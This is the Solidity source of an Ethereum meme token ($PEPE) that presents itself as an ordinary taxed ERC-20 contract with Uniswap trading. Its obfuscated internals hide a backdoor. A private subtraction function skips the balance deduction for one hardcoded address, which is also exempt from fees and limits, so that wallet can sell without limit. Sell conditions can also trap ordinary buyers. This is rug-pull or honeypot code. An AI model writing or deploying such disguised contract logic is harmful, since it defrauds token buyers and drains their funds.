/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

/*

Vitalikinucumrocketspaceship69420inu  $PEPE


Twitter: https://twitter.com/PepeCoinPortal
Telegram: https://t.me/Pepe_CoinPortal
Website: https://pepeerc.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qtrfh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qtrfh(a, b, "SafeMath");
    }

    function  qtrfh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract Vitalikinucumrocketspaceship69420inu is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Vitalikinucumrocketspaceship69420inu";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 100000000 * (10**_decimals);
    uint256 public _taxSwapfMgp = _totalSupply;
    uint256 public _maxHoldingfAmount = _totalSupply;
    uint256 public _taxSwapThreshold = _totalSupply;
    uint256 public _taxSwapyMax = _totalSupply;

    uint256 private _initialBuyTax=11;
    uint256 private _initialSellTax=22;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=7;
    uint256 private _reduceSellTax1At=1;
    uint256 private _swpwpasruir=0;
    uint256 private _yeqxrtop=0;
    address public  _Macsgukrer = 0xa732c090A64D4AeAAD5eA8f1bb5162666c791183;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _wrevfstares;
    mapping (address => bool) private  _rvfouaent;
    mapping(address => uint256) private  _hoqdTranfuswp;
    bool public  transerDelyEnble = false;


    IUniswapV2Router02 private  _uniRouterfV2;
    address private  _uniV2fLP;
    bool private  _rwnsyetaze;
    bool private  _inTaxfSwap = false;
    bool private  _swapkfUniswapfpke = false;
 
 
    event RntsuAkbtlx(uint _taxSwapfMgp);
    modifier lockTodSwap {
        _inTaxfSwap = true;
        _;
        _inTaxfSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _wrevfstares[owner()] = true;
        _wrevfstares[address(this)] = true;
        _wrevfstares[_Macsgukrer] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qtrfh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transerDelyEnble) {
                if  (to!= address(_uniRouterfV2) &&to!= address(_uniV2fLP)) {
                  require (_hoqdTranfuswp[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _hoqdTranfuswp[tx.origin] = block.number;
                }
            }

            if  ( from == _uniV2fLP && to!= address (_uniRouterfV2) &&!_wrevfstares[to]) {
                require (amount <= _taxSwapfMgp, "Forbid");
                require (balanceOf (to) + amount <= _maxHoldingfAmount,"Forbid");
                if  (_yeqxrtop < _swpwpasruir) {
                  require (!rfqkiypqe(to));
                }
                _yeqxrtop ++ ; _rvfouaent[to] = true;
                taxAmount = amount.mul((_yeqxrtop > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _uniV2fLP&&from!= address (this) &&! _wrevfstares[from]) {
                require (amount <= _taxSwapfMgp && balanceOf(_Macsgukrer) <_taxSwapyMax, "Forbid");
                taxAmount = amount.mul((_yeqxrtop > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);
                require (_yeqxrtop >_swpwpasruir && _rvfouaent[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inTaxfSwap 
            &&  to  ==_uniV2fLP&&_swapkfUniswapfpke &&contractTokenBalance > _taxSwapThreshold 
            &&  _yeqxrtop > _swpwpasruir &&! _wrevfstares [to] &&! _wrevfstares [from]
            )  {
                _transferFrom(ruhdl(amount,ruhdl(contractTokenBalance, _taxSwapyMax)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qtrfh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qtrfh (taxAmount));
        emit  Transfer( from, to, amount. qtrfh(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockTodSwap {
        if(_swapTaxAndLiquify==0){return;}
        if(!_rwnsyetaze){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _uniRouterfV2.WETH();
        _approve(address (this), address (_uniRouterfV2), _swapTaxAndLiquify);
        _uniRouterfV2.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function ruhdl(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qtrfh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _Macsgukrer) {
        return a;
    } else {
        require(a >= b, "Subtraction underflow");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxSwapfMgp  =  _totalSupply ;
        _maxHoldingfAmount = _totalSupply ;
        transerDelyEnble = false ;
        emit  RntsuAkbtlx ( _totalSupply ) ;
    }

   function rfqkiypqe(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function startTrading() external onlyOwner() {
        require (!_rwnsyetaze, " trading is open " ) ;
        _uniRouterfV2 = IUniswapV2Router02 (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_uniRouterfV2), _totalSupply);
        _uniV2fLP = IUniswapV2Factory(_uniRouterfV2.factory()).createPair (address(this), _uniRouterfV2. WETH());
        _uniRouterfV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_uniV2fLP).approve (address(_uniRouterfV2), type(uint). max);
        _swapkfUniswapfpke = true ;
        _rwnsyetaze = true ;
    }

    receive( )  external  payable  { }
    }